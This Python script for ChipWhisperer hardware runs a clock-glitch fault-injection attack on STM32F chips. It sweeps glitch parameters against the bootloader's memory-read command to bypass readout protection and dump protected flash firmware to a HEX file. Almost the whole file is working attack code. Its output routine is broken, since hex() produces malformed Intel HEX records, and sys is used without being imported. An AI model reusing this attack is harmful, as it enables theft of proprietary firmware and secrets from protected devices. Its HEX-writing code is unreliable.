#!/opt/homebrew/bin/python3
#
# Replicate work from: https://vk.com/@haccking1-schityvanie-zaschischennoi-proshivki-iz-flesh-pamyati-stm32f
# 		       https://www.youtube.com/watch?v=CRfg9-1BV0k

PLATFORM = 'CW308_STM32F0'
#PLATFORM = 'CW308_STM32F1'
#PLATFORM = 'CW308_STM32F2'
#PLATFORM = 'CW308_STM32F3'
#PLATFORM = 'CW308_STM32F4'
SCOPETYPE = 'OPENADC'

import logging
import chipwhisperer as cw
import usb
import time
from chipwhisperer.hardware.naeusb.programmer_stm32fserial import supported_stm32f
import chipwhisperer.common.results.glitch as glitch
gc = glitch.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset"])
cw.glitch_logger.setLevel(logging.ERROR)

# Check for presence of STM32 chipset
if (PLATFORM == 'CW308_STM32F0' or PLATFORM == 'CW308_STM32F1' or PLATFORM == 'CW308_STM32F2'  or PLATFORM == 'CW308_STM32F3' or PLATFORM == 'CW308_STM32F4' ):
    scope = cw.scope()
    print("Default scope setup")
    scope.default_setup()

    print("Simple serial2 target with default scope")
    target = cw.target(scope, cw.targets.SimpleSerial2)

    try:
        print("Open Programmer, find STM32")
        prog = cw.programmers.STM32FProgrammer()
        prog.scope = scope
        prog._logging = None
        prog.open()
        prog.find()
    except Exception as e:
        print("fail gracefully " + str(e))
        # Disconnect, and allow reuse by another instance
        scope.dis()
        target.dis()

# Functions for firmware dump
def int2str_0xFF(int_number, number_of_bytes):
    return '{0:0{1}X}'.format(int_number,number_of_bytes)

def data_dividing_from_256_to_32_bytes (data_to_divide, mem_sector, mem_step=32):
    if mem_sector > 0xFFFF:
        mem_conversion = mem_sector >> 16
        mem_conversion = mem_sector - (mem_conversion << 16)
    data_out = ''
    for i in range(int(256/mem_step)):
        data_vector = data_to_divide[(i * mem_step):((i + 1) * mem_step)]
        mem_calc = mem_conversion + (i * mem_step)
        data_out += read_and_convert_data_hex_file(data_vector, mem_calc, mem_step) + '\n'
    return data_out

def read_and_convert_data_hex_file(data_to_convert, memory_address, mem_step):
    addr_string = memory_address -((memory_address >> 20) << 20)

    data_buffer = ''
    crcacc = 0
    for x in range(0, len(data_to_convert)):
        data_buffer += int2str_0xFF(data_to_convert[x], 2)
        crcacc += data_to_convert[x]

    crcacc += mem_step

    temp_addr_string = addr_string
    for i in range (4, -1, -2):
        crcacc += temp_addr_string >> i*4
        temp_addr_string -= ((temp_addr_string >> i*4) << i*4)

    crcacc_2nd_symbol = (crcacc >> 8) + 1
    crcacc = (crcacc_2nd_symbol << 8) - crcacc
    if crcacc == 0x100:
        crcacc = 0
    RECTYP = 0x00
#    out_string = ':'+ Int_To_Hex_String(mem_step, 2)  +\
#        Int_To_Hex_String((addr_string),4) +\
#        Int_To_Hex_String(RECTYP, 2) +\
#        data_buffer +\
#        Int_To_Hex_String(crcacc, 2)
    out_string = ':'+ hex(mem_step)  +\
        hex(addr_string) +\
        hex(RECTYP) +\
        data_buffer +\
        hex(crcacc)
    return out_string

def send_to_file(info_to_output, File_name, directory):
    file = open(directory + File_name + '.hex', 'w')
    file.write(info_to_output)
    file.close()

from collections import namedtuple
Range = namedtuple('Range', ['min', 'max', 'step'])

# Dump attempt

File_name = "STM32_dump"
directory = "./"
mem_start = 0x08000000
mem_stop = 0x08000300

############## Code #################

scope.glitch.ext_offset = 0

gc.set_range("width", -49.8, 49.8)
gc.set_range("offset", -49.8, 49.8)
gc.set_global_step([8, 4])
scope.glitch.repeat = 1
scope.adc.timeout = 0.1

#Basic setup
scope.glitch.clk_src = "clkgen" # set glitch input clock
scope.glitch.output = "clock_xor" # glitch_out = clk ^ glitch
scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called

scope.io.hs2 = "glitch"  # output glitch_out on the clock line

#stm32 settings
scope.gain.gain = 45
scope.adc.samples = 5000
scope.adc.offset = 0
scope.clock.clkgen_freq = 7370000
scope.trigger.triggers = "tio4"
scope.clock.adc_src = "clkgen_x4"
scope.io.tio1 = "serial_rx"
scope.io.tio2 = "serial_tx"

# string of start HEX file
Start_of_File_Record = ':020000040800F2'
# Extended_Linera_Address_Record = ':020000040800F2'

# string of end HEX file
End_of_File_Record = ':00000001FF'

start_time = time.time()

length_of_sector = 256
if length_of_sector % 4 != 0:
    sys.exit('length_of_sector must be equal to 4')

output_to_file_buffer = ''
output_to_file_buffer += Start_of_File_Record + '\n'

mem_zero = 0x08000000
mem_64kBytes_counter = 0

mem_current = mem_start
while mem_current < mem_stop:
    # flush the garbage from the computer's target read buffer
    target.ser.flush()
    # run aux stuff that should run before the scope arms here

    #reset_target(scope)
    #prog.reset()
    stm32f = prog.stm32prog()
    stm32f.reset()

    # Print glitch settings
    for glitch_setting in gc.glitch_values():
        scope.glitch.offset = glitch_setting[1]
        scope.glitch.width = glitch_setting[0]

        print('Glitch settings:', scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset)

        try:
            # initialize STM32 after each reset
            stm32f.initChip()
        except IOError:
            print("Failed to detect chip. Check following: ")
            print("   1. Connections and device power. ")
            print("   2. Device has valid clock (or remove clock entirely for internal osc).")
            print("   3. On Rev -02 CW308T-STM32Fx boards, BOOT0 is routed to PDIC.")
            raise

        stm32f.find()

        boot_version = stm32f.cmdGet()
        chip_id = stm32f.cmdGetID()

        scope.arm()

        try:
            # reading of closed memory sector
            data = stm32f.cmdReadMemory(mem_current, length_of_sector)
            print("You son of a bitch! You got it!")
        except Exception as message:
            message = str(message)
            if "Can't read port" in message:
                print('Port silence')
                pass
            elif 'Unknown response. 0x11: 0x0' in message:
                print('Crashed. Reload!')
                pass
            elif 'NACK 0x11' in message:
#                print('Firmware is closed!')
                pass
            else:
                print('Unknown error:', message, scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset)
                pass

        else:
            data_to_out = data_dividing_from_256_to_32_bytes (data, mem_current)
            print(data_to_out)
            output_to_file_buffer += data_to_out
            mem_current += length_of_sector

output_to_file_buffer += End_of_File_Record + '\n'
send_to_file(output_to_file_buffer, File_name, directory)
print('done writing file')
print("--- %s seconds ---" % (time.time() - start_time))
# Cleanup 
scope.dis()
target.dis()

